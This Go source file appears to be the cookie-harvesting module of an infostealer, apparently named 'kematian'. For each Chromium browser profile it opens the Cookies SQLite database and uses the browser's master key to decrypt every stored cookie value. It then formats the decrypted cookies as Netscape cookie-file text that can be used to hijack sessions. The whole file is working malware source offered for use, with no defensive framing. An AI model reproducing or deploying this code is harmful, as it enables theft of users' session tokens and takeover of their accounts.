package cookies

import (
	"database/sql"
	"kdot/kematian/browsers/chromium/structs"
	"kdot/kematian/decryption"
)

func GetCookiesAuto(browsersList []structs.Browser) []structs.CookiesOutput {
	var cookies []structs.CookiesOutput
	for _, browser := range browsersList {
		var cookiesFound = ""
		for _, profile := range browser.Profiles {
			path := profile.Cookies

			master_key := decryption.GetMasterKey(browser.LocalState)
			db, err := sql.Open("sqlite3", path)
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var host_key string
				var name string
				var path_this string
				var encrypted_value []byte
				var expires_utc string
				row.Scan(&host_key, &name, &path_this, &encrypted_value, &expires_utc)
				decrypted, err := decryption.DecryptPassword(encrypted_value, master_key)
				if err != nil {
					decrypted = string(encrypted_value)
				}
				expired := "TRUE"
				if expires_utc == "0" {
					expired = "FALSE"
				}
				tf_other := "TRUE"
				if host_key[0] == '.' {
					tf_other = "FALSE"
				}
				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path_this + "\t" + name + "\t" + decrypted + "\t" + expired + "\n"
			}
		}
		cookies = append(cookies, structs.CookiesOutput{BrowserName: browser.ProfilePath, Cookies: cookiesFound})
	}
	return cookies
}
